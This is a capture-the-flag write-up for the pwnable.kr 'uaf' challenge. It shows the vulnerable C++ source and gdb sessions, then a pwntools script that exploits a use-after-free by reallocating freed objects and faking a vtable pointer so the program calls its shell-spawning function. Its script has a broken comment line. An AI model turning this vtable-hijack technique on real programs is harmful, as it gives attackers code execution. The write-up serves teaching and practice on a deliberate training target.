---
title: Pwnable.kr Uaf
date: 2022-08-21T00:14:55+02:00
tags: ['cs/security']
aliases: ['']
---

As the challenge name indicates, this challenge has Use After Free Bug. It is
written in C++ and has the following source code:

```cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

The bug is clear, we can free the variables w and m but still call methods from
them. Moreover, we can create new objects of arbitrary size with any content we
want. Taking a quick look at the assembly, we can see that `Man` and `Woman` are
both allocated bins of size *24* so we need to allocate two bins of that size.
Let's try filling a file with 24 As and running under gdb we get:

```
gef➤  r 24 test
Starting program: /home/yigit/Downloads/pwnable.kr/uaf/uaf 24 test
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400fcd <main+265>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fd1 <main+269>       mov    rax, QWORD PTR [rax]
     0x400fd4 <main+272>       add    rax, 0x8
 →   0x400fd8 <main+276>       mov    rdx, QWORD PTR [rax]
     0x400fdb <main+279>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fdf <main+283>       mov    rdi, rax
     0x400fe2 <main+286>       call   rdx
     0x400fe4 <main+288>       mov    rax, QWORD PTR [rbp-0x30]
     0x400fe8 <main+292>       mov    rax, QWORD PTR [rax]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x400fd8 in main (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400fd8 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/20xw $rax
0x4141414141414141:     Cannot access memory at address 0x4141414141414149
```

As we can see, the As are moved to rax. If we continue reading the disassembly,
we can see that the address at rax is dereferenced several times and eventually
used to call a function. This is because the classes have virtual functions
defined and hence [vtables](https://shaharmike.com/cpp/vtable-part1/) are used 
to call functions. When we inspect the memory during the normal execution of the
program, we see that the address pointed to by rax after running:

```
     0x400fcd <main+265>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fd1 <main+269>       mov    rax, QWORD PTR [rax]
```

actually has the address of `Human::give_shell`. So, if we place that address-8
into the file we write to the allocated space, it should drop us a shell.

Here is some gdb commands to see what is going on in memory

```
 →   0x400fcd <main+265>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fd1 <main+269>       mov    rax, QWORD PTR [rax]
     0x400fd4 <main+272>       add    rax, 0x8
     0x400fd8 <main+276>       mov    rdx, QWORD PTR [rax]
     0x400fdb <main+279>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fdf <main+283>       mov    rdi, rax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x400fcd in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400fcd → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/2xg $rbp-0x38
0x7fffffffd088: 0x0000000000614ee0      0x0000000000614f30
gef➤  x/2xg 0x7fffffffd088
0x7fffffffd088: 0x0000000000614ee0      0x0000000000614f30
gef➤  x/2xg 0x0000000000614ee0
0x614ee0:       0x0000000000401570      0x0000000000000019
gef➤  x/2xg 0x0000000000401570
0x401570 <_ZTV3Man+16>: 0x000000000040117a      0x00000000004012d2
gef➤  x/5xi 0x000000000040117a
   0x40117a <_ZN5Human10give_shellEv>:  push   rbp
   0x40117b <_ZN5Human10give_shellEv+1>:        mov    rbp,rsp
   0x40117e <_ZN5Human10give_shellEv+4>:        sub    rsp,0x10
   0x401182 <_ZN5Human10give_shellEv+8>:        mov    QWORD PTR [rbp-0x8],rdi
   0x401186 <_ZN5Human10give_shellEv+12>:       mov    edi,0x4014a8
```

Therefore all we need to write is `0x0000000000401570 - 8` to the first bytes of
the file and pad the rest. Here is the exploit for that:

```py
from pwn import *

magic_addr = 0x401570 - 8 # 0x401570 points to the address of Human::give_shell
substracting 8 runs the function

payload = p32(magic_addr).ljust(24, b"\x00")

with open("payload", "wb") as f:
    f.write(payload)


p = process(["/home/uaf/uaf", "24", "payload"])

p.writeline("3") # Free objects
p.writeline("2") # Allocate bins of size 24 each
p.writeline("2")
p.writeline("1")
p.clean()
p.writeline("cat /home/uaf2/flag")
print(p.clean())
```
